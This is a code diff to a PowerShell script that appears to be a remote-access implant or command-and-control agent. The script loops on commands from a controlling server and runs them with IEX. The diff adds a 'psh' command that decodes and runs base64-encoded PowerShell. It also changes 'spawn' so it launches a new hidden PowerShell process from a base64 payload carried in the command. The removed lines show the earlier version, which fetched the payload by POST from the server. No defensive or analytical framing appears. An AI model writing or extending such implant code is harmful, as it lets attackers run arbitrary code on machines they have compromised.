@@ -60,10 +60,9 @@ while ($True) {
 			exit
 		}
 
-    if($jsObject['cmnd'] -eq "spawn") {
+    if($jsObject['cmnd'].split(" ")[0] -eq "spawn") {
 		 try {
-			  $req = "{`"type`": `"$type`", `"id`": $id, `"un`": `"$un`", `"req`": `"spawn ps1`"}"
-			  $selfdata = (Invoke-WebRequest -Method Post -Uri $h0me -Body $req -UserAgent $useragent -UseBasicParsing).Content
+        $selfdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
 			  $selfdata = $selfdata.replace('"','"""')
 			  Start-Process powershell -ArgumentList "-c $selfdata" -NoNewWindow
 				$retval = "[+] Spawn success..."
@@ -73,6 +72,15 @@ while ($True) {
 			}
 		}
 
+    elseif($jsObject['cmnd'].split(" ")[0] -eq "psh") {
+      $psdata = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($jsObject['cmnd'].split(" ")[1]))
+			$retval = IEX $psdata -ErrorVariable err 2>&1
+			if($err) {
+				$retval = $retval + "`n[-] Errors returned:`n`n" + $err
+				$err = ""
+			}
+    }
+
 		else {
 			$retval = IEX $jsObject['cmnd'] -ErrorVariable err 2>&1
 			if($err) {
@@ -80,6 +88,7 @@ while ($True) {
 				$err = ""
 			}
 		}
+
 		if(!($retval)) {
 			$retval = "[*] No output returned"
 		}
